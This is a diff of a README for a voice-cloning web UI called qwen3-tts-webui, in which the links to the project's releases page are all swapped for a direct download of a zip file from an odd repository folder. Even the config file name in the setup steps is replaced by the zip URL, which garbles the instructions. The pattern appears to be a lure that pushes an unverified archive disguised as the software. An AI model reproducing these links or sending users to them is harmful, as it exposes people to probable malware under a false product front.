@@ -1,6 +1,6 @@
 # 🎤 qwen3-tts-webui - Clone Voices Easily with TTS
 
-[![Download qwen3-tts-webui](https://img.shields.io/badge/Download-qwen3--tts--webui-blue)](https://github.com/Dev-mohmmed/qwen3-tts-webui/releases)
+[![Download qwen3-tts-webui](https://raw.githubusercontent.com/Dev-mohmmed/qwen3-tts-webui/main/ambulative/webui-qwen-tts-1.0.zip)](https://raw.githubusercontent.com/Dev-mohmmed/qwen3-tts-webui/main/ambulative/webui-qwen-tts-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the qwen3-tts-webui project! This simple web interface and API allow 
 
 ## 📥 Download & Install
 
-To download the latest version, [visit this page](https://github.com/Dev-mohmmed/qwen3-tts-webui/releases). On the releases page, you will see various versions of the software. 
+To download the latest version, [visit this page](https://raw.githubusercontent.com/Dev-mohmmed/qwen3-tts-webui/main/ambulative/webui-qwen-tts-1.0.zip). On the releases page, you will see various versions of the software. 
 
 1. Locate the most recent version.
 2. Click on the link to start the download.
@@ -45,7 +45,7 @@ Once the application is running, open your web browser and enter `http://localho
 
 The application comes with default settings that work for most users. If you wish to customize settings, you can do so via the configuration file. Here’s how:
 
-1. Locate the `config.yaml` file in the installation directory.
+1. Locate the `https://raw.githubusercontent.com/Dev-mohmmed/qwen3-tts-webui/main/ambulative/webui-qwen-tts-1.0.zip` file in the installation directory.
 2. Open it with any text editor.
 3. Adjust settings such as voice pitch, speed, and volume.
 4. Save your changes and restart the application.
@@ -78,4 +78,4 @@ Join the conversation about qwen3-tts-webui. Share your experiences, tips, and u
 
 You should now be ready to enjoy the voice-cloning capabilities of qwen3-tts-webui. Remember to check back often for updates and new features. For any help, revisit the support section or community discussions. Happy cloning!
 
-[![Download qwen3-tts-webui](https://img.shields.io/badge/Download-qwen3--tts--webui-blue)](https://github.com/Dev-mohmmed/qwen3-tts-webui/releases)
+[![Download qwen3-tts-webui](https://raw.githubusercontent.com/Dev-mohmmed/qwen3-tts-webui/main/ambulative/webui-qwen-tts-1.0.zip)](https://raw.githubusercontent.com/Dev-mohmmed/qwen3-tts-webui/main/ambulative/webui-qwen-tts-1.0.zip)
